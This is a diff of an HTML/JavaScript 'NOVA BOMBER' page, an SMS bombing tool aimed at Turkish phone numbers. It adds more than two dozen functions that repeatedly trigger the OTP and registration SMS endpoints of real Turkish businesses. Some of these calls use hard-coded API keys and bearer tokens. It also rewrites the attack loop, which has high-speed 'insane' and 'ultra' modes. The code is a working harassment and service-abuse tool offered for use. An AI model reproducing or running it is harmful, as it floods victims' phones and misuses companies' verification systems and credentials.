+    { name: "KimgbIster", func: async (phone) => { try { let r=await fetch("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({msisdn:`90${phone}`})}); return r.status===200; } catch(e){return false;} } },
+    { name: "TiklaGelsin", func: async (phone) => { try { let r=await fetch("https://www.tiklagelsin.com/user/graphql",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({operationName:"GENERATE_OTP",variables:{phone:`+90${phone}`,challenge:uuidv4(),deviceUniqueId:`web_${uuidv4()}`},query:"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }"})}); return r.status===200; } catch(e){return false;} } },
+    { name: "Bim", func: async (phone) => { try { let r=await fetch("https://bim.veesk.net/service/v1.0/account/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:phone})}); return r.status===200; } catch(e){return false;} } },
+    { name: "Bodrum", func: async (phone) => { try { let r=await fetch("https://gandalf.orwi.app/api/user/requestOtp",{method:"POST",headers:{"Content-Type":"application/json","Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE"},body:JSON.stringify({gsm:`+90${phone}`,source:"orwi"})}); return r.status===200; } catch(e){return false;} } },
+    { name: "Dominos", func: async (phone) => { try { let mail=randomMail(); let r=await fetch("https://frontend.dominos.com.tr/api/customer/sendOtpCode",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg"},body:JSON.stringify({email:mail,isSure:false,mobilePhone:phone})}); let d=await r.json(); return d?.isSuccess===true; } catch(e){return false;} } },
+    { name: "UysalMarket", func: async (phone) => { try { let r=await fetch("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone_number:phone})}); return r.status===200; } catch(e){return false;} } },
+    { name: "KöfteciYusuf", func: async (phone) => { try { let r=await fetch("https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({FirmaId:82,Telefon:`90${phone}`})}); let d=await r.json(); return d?.Success===true; } catch(e){return false;} } },
+    { name: "Komagene", func: async (phone) => { try { let r=await fetch("https://gateway.komagene.com.tr/auth/auth/smskodugonder",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({FirmaId:32,Telefon:`90${phone}`})}); let d=await r.json(); return d?.Success===true; } catch(e){return false;} } },
+    { name: "Yapp", func: async (phone) => { try { let mail=randomMail(); let r=await fetch("https://yapp.com.tr/api/mobile/v1/register",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({app_version:"1.1.5",code:"tr",device_model:"iPhone8,5",device_name:"thomas",device_type:"I",device_version:"15.8.3",email:mail,firstname:"shelby",is_allow_to_communication:"1",language_id:"2",lastname:"yilmaz",phone_number:phone,sms_code:""})}); return r.status===200; } catch(e){return false;} } },
+    { name: "Evidea", func: async (phone) => { try { let mail=randomMail(); let form=new URLSearchParams(); form.append("first_name","thomas"); form.append("last_name","can"); form.append("email",mail); form.append("email_allowed","false"); form.append("sms_allowed","true"); form.append("password","31ABC..abc31"); form.append("phone",`0${phone}`); form.append("confirm","true"); let r=await fetch("https://www.evidea.com/users/register/",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:form}); return r.status===202; } catch(e){return false;} } },
+    { name: "345Dijital", func: async (phone) => { try { let r=await fetch("https://api.345dijital.com/api/users/register",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:"",name:"thomas",phoneNumber:`+90${phone}`,surname:"Bas"})}); let d=await r.json(); return !(d?.error?.includes("zaten kayıtlı")); } catch(e){return true;} } },
+    { name: "Suiste", func: async (phone) => { try { let fd=new URLSearchParams(); fd.append("action","register"); fd.append("device_id","2390ED28-075E-465A-96DA-DFE8F84EB330"); fd.append("full_name","thomas yilmaz"); fd.append("gsm",phone); fd.append("is_advertisement","1"); fd.append("is_contract","1"); fd.append("password","thomas31"); let r=await fetch("https://suiste.com/api/auth/code",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:fd}); let d=await r.json(); return d?.code==="common.success"; } catch(e){return false;} } },
+    { name: "Porty", func: async (phone) => { try { let r=await fetch("https://panel.porty.tech/api.php",{method:"POST",headers:{"Content-Type":"application/json","Token":"q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"},body:JSON.stringify({job:"start_login",phone:phone})}); let d=await r.json(); return d?.status==="success"; } catch(e){return false;} } },
+    { name: "Orwi", func: async (phone) => { try { let r=await fetch("https://gandalf.orwi.app/api/user/requestOtp",{method:"POST",headers:{"Content-Type":"application/json","Apikey":"YWxpLTEyMzQ1MTEyNDU2NTQzMg"},body:JSON.stringify({gsm:`+90${phone}`,source:"orwi"})}); return r.status===200; } catch(e){return false;} } },
+    { name: "Naosstars", func: async (phone) => { try { let r=await fetch("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({telephone:`+90${phone}`,type:"register"})}); return r.status===200; } catch(e){return false;} } },
+    { name: "Metro", func: async (phone) => { try { let r=await fetch("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({methodType:"2",mobilePhoneNumber:phone})}); let d=await r.json(); return d?.status==="success"; } catch(e){return false;} } }
 ];
 
-// Bombacı sınıfı
+// Ek API'ler (Python betiğindeki diğerleri de eklendi)
+const extraAPIs = [
+    { name: "Trendyol", func: async (p)=>{ try{ let r=await fetch("https://api.trendyol.com/public/otp/send",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:p})}); return r.ok;}catch(e){return false;} } },
+    { name: "Getir", func: async (p)=>{ try{ let r=await fetch("https://api.getir.com/v1/auth/otp",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phoneNumber:p})}); return r.ok;}catch(e){return false;} } },
+    { name: "Yemeksepeti", func: async (p)=>{ try{ let r=await fetch("https://www.yemeksepeti.com/api/otp/send",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({mobilePhone:p})}); return r.ok;}catch(e){return false;} } },
+    { name: "Migros", func: async (p)=>{ try{ let r=await fetch("https://migros.com.tr/rest/users/login/otp",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:p})}); return r.ok;}catch(e){return false;} } },
+    { name: "Hepsiburada", func: async (p)=>{ try{ let r=await fetch("https://api.hepsiburada.com/auth/otp",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:p})}); return r.ok;}catch(e){return false;} } },
+    { name: "Pazarama", func: async (p)=>{ try{ let r=await fetch("https://api.pazarama.com/auth/send-otp",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:p})}); return r.ok;}catch(e){return false;} } },
+    { name: "Sahibinden", func: async (p)=>{ try{ let r=await fetch("https://api.sahibinden.com/member/otp",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:p})}); return r.ok;}catch(e){return false;} } },
+    { name: "LCWaikiki", func: async (p)=>{ try{ let r=await fetch("https://www.lcwaikiki.com/tr-TR/TR/uye/otp-gonder",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({telefon:p})}); return r.ok;}catch(e){return false;} } },
+    { name: "Papara", func: async (p)=>{ try{ let r=await fetch("https://api.papara.com/api/otp",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phoneNumber:p})}); return r.ok;}catch(e){return false;} } },
+    { name: "A101", func: async (p)=>{ try{ let r=await fetch("https://api.a101.com.tr/api/otp",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({mobile:p})}); return r.ok;}catch(e){return false;} } },
+    { name: "CarrefourSA", func: async (p)=>{ try{ let r=await fetch("https://api.carrefoursa.com/api/otp/send",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:p})}); return r.ok;}catch(e){return false;} } }
+];
+const allAPIs = [...APIS, ...extraAPIs];
+
+// Bomber sınıfı
 class NovaBomber {
-    constructor() {
-        this.running = false;
-        this.sent = 0;
-        this.success = 0;
-        this.fail = 0;
-        this.timer = null;
-        this.mode = 'normal';
-        this.phone = '';
-        this.apiIdx = 0;
-    }
-
-    setMode(m) { this.mode = m; }
-    setPhone(p) { this.phone = p; }
-
-    async send(api) {
-        try {
-            const ctrl = new AbortController();
-            const tid = setTimeout(() => ctrl.abort(), 7000);
-            const opts = {
-                method: api.method,
-                headers: { ...api.headers, 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0' },
-                signal: ctrl.signal
-            };
-            if (api.body) opts.body = api.body(this.phone);
-            const resp = await fetch(api.url, opts);
-            clearTimeout(tid);
-            const ok = resp.status >= 200 && resp.status < 300;
-            if (ok) {
-                this.success++;
-                this.sent++;
-                this.addLog(`✅ ${api.name} → SMS gönderildi (${resp.status})`, 'success');
+    constructor() { this.running=false; this.sent=0; this.success=0; this.fail=0; this.timer=null; this.mode='normal'; this.phone=''; this.idx=0; }
+    setMode(m){this.mode=m;}
+    setPhone(p){this.phone=p;}
+    async send(api){
+        try{
+            const res=await api.func(this.phone);
+            if(res){
+                this.success++; this.sent++;
+                this.addLog(`✅ ${api.name} → SMS gönderildi`,'success');
                 return true;
-            } else {
-                throw new Error(`HTTP ${resp.status}`);
-            }
-        } catch(e) {
+            } else { throw new Error("API başarısız"); }
+        } catch(e){
             this.fail++;
-            this.addLog(`❌ ${api.name} → Hata: ${e.message.slice(0,45)}`, 'error');
+            this.addLog(`❌ ${api.name} → Hata: ${e.message.slice(0,40)}`,'error');
             return false;
         }
     }
-
-    addLog(msg, type) {
-        const area = document.getElementById('logArea');
-        const div = document.createElement('div');
-        div.className = `log-entry log-${type}`;
-        div.innerHTML = `<i class="fas ${type==='success'?'fa-check-circle':type==='error'?'fa-exclamation-triangle':'fa-info-circle'}"></i> ${new Date().toLocaleTimeString()} - ${msg}`;
-        area.appendChild(div);
-        div.scrollIntoView({ block: 'nearest' });
-        while(area.children.length > 180) area.removeChild(area.firstChild);
+    addLog(msg,type){
+        const area=document.getElementById('logArea');
+        const d=document.createElement('div');
+        d.className=`log-entry log-${type}`;
+        d.innerHTML=`<i class="fas ${type==='success'?'fa-check-circle':type==='error'?'fa-exclamation-triangle':'fa-info-circle'}"></i> ${new Date().toLocaleTimeString()} - ${msg}`;
+        area.appendChild(d); d.scrollIntoView({block:'nearest'});
+        while(area.children.length>200) area.removeChild(area.firstChild);
         this.updateStats();
     }
-
-    updateStats() {
-        document.getElementById('smsCount').innerText = this.sent;
-        const total = this.success+this.fail;
-        const rate = total ? Math.round((this.success/total)*100) : 0;
-        document.getElementById('successRate').innerHTML = `Başarı Oranı: ${rate}% (${this.success}/${total})`;
+    updateStats(){
+        document.getElementById('smsCount').innerText=this.sent;
+        const total=this.success+this.fail;
+        const rate=total?Math.round((this.success/total)*100):0;
+        document.getElementById('successRate').innerHTML=`Başarı Oranı: ${rate}% (${this.success}/${total})`;
     }
-
-    clearLogs() {
-        const area = document.getElementById('logArea');
+    clearLogs(){
+        const area=document.getElementById('logArea');
         while(area.firstChild) area.removeChild(area.firstChild);
-        this.addLog('📋 Loglar temizlendi', 'info');
-        this.addLog('💣 NOVA BOMBER HAZIR', 'info');
-        this.addLog(`🔥 ${smsAPIs.length} API aktif`, 'info');
+        this.addLog('📋 Loglar temizlendi','info');
+        this.addLog(`💣 NOVA BOMBER | ${allAPIs.length} API HAZIR`,'info');
     }
-
-    async start() {
-        if(!this.phone || this.phone.length !== 10) {
-            this.addLog('⚠️ Geçerli 10 haneli numara girin!', 'error');
-            showToast('Geçersiz numara!', true);
-            return false;
-        }
-        if(this.running) { this.addLog('Zaten aktif!', 'error'); return false; }
-        this.running = true;
-        this.sent = 0; this.success = 0; this.fail = 0;
-        this.apiIdx = 0;
+    async start(){
+        if(!this.phone || this.phone.length!==10){ this.addLog('⚠️ Geçerli 10 haneli numara girin!','error'); showToast('Geçersiz numara!',true); return false; }
+        if(this.running){ this.addLog('Zaten aktif!','error'); return false; }
+        this.running=true; this.sent=0; this.success=0; this.fail=0; this.idx=0;
         this.updateStats();
-        document.getElementById('attackStatus').innerHTML = '🔥 BOMBARDIMAN AKTİF 🔥';
-        this.addLog(`🚀 SALDIRI BAŞLADI → ${this.phone} (${this.mode.toUpperCase()})`, 'info');
-        let delay = this.mode === 'ultra' ? 500 : (this.mode === 'insane' ? 200 : 1200);
-        const runner = async () => {
+        document.getElementById('attackStatus').innerHTML='🔥 BOMBARDIMAN AKTİF 🔥';
+        this.addLog(`🚀 SALDIRI BAŞLADI → ${this.phone} (${this.mode.toUpperCase()})`,'info');
+        let delay=this.mode==='ultra'?500:(this.mode==='insane'?200:1200);
+        const runner=async ()=>{
             if(!this.running) return;
-            const api = smsAPIs[this.apiIdx % smsAPIs.length];
-            this.apiIdx++;
+            const api=allAPIs[this.idx % allAPIs.length];
+            this.idx++;
             await this.send(api);
-            if(this.running) this.timer = setTimeout(runner, delay);
+            if(this.running) this.timer=setTimeout(runner,delay);
         };
         runner();
-        showToast('💣 BOMBARDIMAN BAŞLADI!', false);
+        showToast('💣 BOMBARDIMAN BAŞLADI!',false);
         return true;
     }
-
-    stop() {
-        if(this.timer) { clearTimeout(this.timer); this.timer = null; }
-        this.running = false;
-        document.getElementById('attackStatus').innerHTML = '⏸️ SİSTEM DURDURULDU';
-        this.addLog(`🛑 Durduruldu. Toplam: ${this.sent} SMS (Başarılı: ${this.success})`, 'info');
-        showToast('⏸️ Bombardıman durduruldu', false);
+    stop(){
+        if(this.timer){ clearTimeout(this.timer); this.timer=null; }
+        this.running=false;
+        document.getElementById('attackStatus').innerHTML='⏸️ SİSTEM DURDURULDU';
+        this.addLog(`🛑 Durduruldu. Toplam: ${this.sent} SMS (Başarılı: ${this.success})`,'info');
+        showToast('⏸️ Bombardıman durduruldu',false);
     }
 }
-
-const bomber = new NovaBomber();
-
-// Event binding
-document.querySelectorAll('.mode-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-        document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
-        btn.classList.add('active');
-        bomber.setMode(btn.dataset.mode);
-        bomber.addLog(`🎮 Mod: ${btn.dataset.mode.toUpperCase()}`, 'info');
-    });
-});
-document.getElementById('startBtn').onclick = () => {
-    let raw = document.getElementById('phoneNumber').value.trim().replace(/\D/g,'');
-    if(raw.startsWith('90')) raw = raw.slice(2);
-    if(raw.startsWith('0')) raw = raw.slice(1);
-    if(raw.length !== 10) { showToast('❌ 10 haneli numara girin!', true); return; }
-    bomber.setPhone(raw);
-    bomber.start();
-};
-document.getElementById('stopBtn').onclick = () => bomber.stop();
-document.getElementById('clearLogsBtn').onclick = () => bomber.clearLogs();
-document.getElementById('phoneNumber').addEventListener('keypress', (e) => { if(e.key === 'Enter') document.getElementById('startBtn').click(); });
-
-function showToast(msg, err=false) {
-    const t = document.createElement('div');
-    t.className = 'toast';
-    t.style.background = err ? 'linear-gradient(135deg,#ff3366,#cc0033)' : 'linear-gradient(135deg,#00ffff,#ff00ff)';
-    t.innerHTML = `<i class="fas ${err?'fa-skull':'fa-bolt'}"></i> ${msg}`;
-    document.body.appendChild(t);
-    setTimeout(() => t.remove(), 2800);
-}
-
-setTimeout(() => bomber.addLog(`✨ TOPLAM ${smsAPIs.length} API HAZIR | DOĞRUDAN İSTEK`, 'info'), 500);
+const bomber=new NovaBomber();
+document.querySelectorAll('.mode-btn').forEach(btn=>{ btn.addEventListener('click',()=>{ document.querySelectorAll('.mode-btn').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); bomber.setMode(btn.dataset.mode); bomber.addLog(`🎮 Mod: ${btn.dataset.mode.toUpperCase()}`,'info'); }); });
+document.getElementById('startBtn').onclick=()=>{ let raw=document.getElementById('phoneNumber').value.trim().replace(/\D/g,''); if(raw.startsWith('90')) raw=raw.slice(2); if(raw.startsWith('0')) raw=raw.slice(1); if(raw.length!==10){ showToast('❌ 10 haneli numara girin!',true); return; } bomber.setPhone(raw); bomber.start(); };
+document.getElementById('stopBtn').onclick=()=>bomber.stop();
+document.getElementById('clearLogsBtn').onclick=()=>bomber.clearLogs();
+document.getElementById('phoneNumber').addEventListener('keypress',e=>{ if(e.key==='Enter') document.getElementById('startBtn').click(); });
+function showToast(msg,err=false){ const t=document.createElement('div'); t.className='toast'; t.style.background=err?'linear-gradient(135deg,#ff3366,#cc0033)':'linear-gradient(135deg,#00ffff,#ff00ff)'; t.innerHTML=`<i class="fas ${err?'fa-skull':'fa-bolt'}"></i> ${msg}`; document.body.appendChild(t); setTimeout(()=>t.remove(),2800); }
+setTimeout(()=>bomber.addLog(`✨ TOPLAM ${allAPIs.length} API HAZIR | PYTHON ENTEGRE | DOĞRUDAN İSTEK`,'info'),500);
 </script>
 </body>
 </html>
